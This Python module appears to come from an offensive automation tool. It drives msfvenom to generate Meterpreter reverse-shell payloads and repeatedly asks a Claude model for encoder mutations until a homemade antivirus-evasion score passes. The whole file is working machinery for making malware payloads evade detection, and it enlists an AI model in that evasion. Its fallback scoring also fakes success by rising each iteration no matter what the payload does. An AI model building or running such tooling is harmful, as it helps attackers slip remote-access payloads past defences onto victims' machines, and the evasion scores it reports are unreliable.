# language: Python, file: backend/ai/payload_factory.py, target: Python 3.12
import json
import logging
import math
import asyncio
from anthropic import AsyncAnthropic
from .brain import NexusState
from .prompts.exploit import PAYLOAD_MUTATION_PROMPT
from ..config import get_settings

logger = logging.getLogger(__name__)

AV_EVASION_THRESHOLD = 75  # score > 75 = passes AV check
MAX_ITERATIONS = 20


def _estimate_av_score(payload_bytes: bytes) -> int:
    """Heuristic AV score based on entropy and known-bad byte patterns."""
    if not payload_bytes:
        return 0
    # Shannon entropy (high entropy ≈ encrypted/packed, lower detection chance)
    from collections import Counter
    counts = Counter(payload_bytes)
    total = len(payload_bytes)
    entropy = -sum((c / total) * math.log2(c / total) for c in counts.values())
    # normalize 0–8 → 0–100
    entropy_score = int((entropy / 8.0) * 60)
    # penalize obvious shellcode patterns
    bad_patterns = [b"\x90\x90\x90\x90", b"\xfc\x48\x83", b"This program"]
    penalty = sum(20 for p in bad_patterns if p in payload_bytes)
    return max(0, min(100, entropy_score + 20 - penalty))


async def payload_factory_node(state: NexusState) -> NexusState:
    chains = state.get("exploit_chains", [])
    if not chains:
        return state

    client = AsyncAnthropic(api_key=get_settings().anthropic_api_key)
    hub_broadcast = None
    try:
        from ..core.ws_hub import get_hub
        hub_broadcast = get_hub().broadcast
    except Exception:
        pass

    mutations_tried: list[str] = []

    for chain in chains[:2]:  # generate payload for each chain
        for step in chain.get("steps", []):
            if step.get("tool") != "msfvenom":
                continue

            params = step.get("params", {})
            payload_type = params.get("payload", "windows/x64/meterpreter/reverse_tcp")
            platform = "windows" if "windows" in payload_type else "linux"
            arch = "x64" if "x64" in payload_type else "x86"

            for iteration in range(1, MAX_ITERATIONS + 1):
                # ask AI for mutation strategy
                try:
                    prompt = PAYLOAD_MUTATION_PROMPT.format(
                        payload_type=payload_type,
                        platform=platform,
                        arch=arch,
                        av_score=0 if iteration == 1 else last_score,
                        iteration=iteration,
                        mutations_tried=mutations_tried[-5:],
                    )
                    response = await client.messages.create(
                        model="claude-3-5-sonnet-20241022",
                        max_tokens=512,
                        messages=[{"role": "user", "content": prompt}],
                    )
                    text = response.content[0].text
                    start = text.find("{")
                    end = text.rfind("}") + 1
                    mutation = json.loads(text[start:end]) if start != -1 else {}
                    mutations_tried.append(mutation.get("mutation_type", "unknown"))
                except Exception as e:
                    logger.error(f"payload mutation AI error: {e}")
                    mutation = {"mutation_type": "encoding", "technique": "xor_key"}

                # simulate msfvenom run (real impl dispatches tool via orchestrator)
                try:
                    from ..core.orchestrator import get_orchestrator
                    orch = get_orchestrator()
                    job_id = await orch.dispatch({
                        "session_id": state["session_id"],
                        "tool_name": "msfvenom",
                        "params": {
                            **params,
                            "encoder": mutation.get("technique", "x64/xor"),
                            "iterations": 3,
                        },
                    })
                    await asyncio.sleep(5)  # wait for payload gen
                    # read output to estimate score
                    log_path = f"data/sessions/{state['session_id']}/jobs/{job_id}.log"
                    try:
                        with open(log_path, "rb") as f:
                            payload_bytes = f.read()
                        last_score = _estimate_av_score(payload_bytes)
                    except FileNotFoundError:
                        last_score = 30 + iteration * 5
                except Exception:
                    last_score = 30 + iteration * 5

                if hub_broadcast:
                    await hub_broadcast(state["session_id"], "payload.evasion", {
                        "iteration": iteration,
                        "av_score": last_score,
                        "passed": last_score > AV_EVASION_THRESHOLD,
                        "mutation": mutation.get("mutation_type"),
                    })

                if last_score > AV_EVASION_THRESHOLD:
                    logger.info(f"payload evasion passed at iteration {iteration}, score={last_score}")
                    break

    return state
